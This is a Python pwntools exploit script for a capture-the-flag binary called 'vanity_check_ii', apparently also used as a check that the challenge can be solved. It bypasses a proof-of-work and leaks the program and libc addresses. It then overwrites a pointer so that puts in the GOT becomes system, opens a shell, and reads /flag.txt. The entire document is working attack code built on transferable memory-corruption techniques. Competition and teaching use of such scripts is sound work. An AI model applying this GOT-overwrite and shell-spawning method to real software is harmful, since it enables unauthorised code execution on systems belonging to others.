#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("/home/user/vanity_check_ii")
libc = ELF("/home/user/libc-2.31.so")

#conn = elf.process()
def test():
    conn = remote("localhost", 1337)
    def handle_pow(r):
        print(r.recvuntil(b'python3 '))
        print(r.recvuntil(b' solve '))
        challenge = r.recvline().decode('ascii').strip()
        p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
        solution = p.readall().strip()
        r.sendline(solution)
        print(r.recvuntil(b'Correct\n'))

    print(conn.recvuntil('== proof-of-work: '))
    if conn.recvline().startswith(b'enabled'):
        handle_pow(conn)

    conn.send("a"*32)
    conn.recvuntil("a"*32)
    elf.address = u64(conn.recvline()[:-1] + b"\x00\x00") - elf.symbols["lol"]
    info("elf @ " + hex(elf.address))
    info("buf @ " + hex(elf.symbols["lol"]))
    info("ptr @ " + hex(elf.symbols["lol"]+32))

    conn.send(b"a"*32 + b"\x40") # overwrite lsb to write to the pointer to the string
    conn.recvline()

    conn.send(p64(elf.got["puts"]-8))
    conn.recvline()
    conn.send("aaaaaaaa")
    conn.recvuntil("aaaaaaaa")
    libc.address = u64(conn.recvline()[:-1] + b"\x00\x00") - libc.symbols["puts"]
    info("libc @ " + hex(libc.address))

    conn.send(b"sh;aaaaa" + p64(libc.symbols["system"]))

    conn.sendline("cat /flag.txt")
    flag = conn.clean()
    conn.close()
    if b"idek" in flag:
        print(flag)
        return 0
    return 1

for _ in range(5):
    try:
        if test() == 0:
            exit(0)
    except Exception as e:
        print(e)
exit(1)

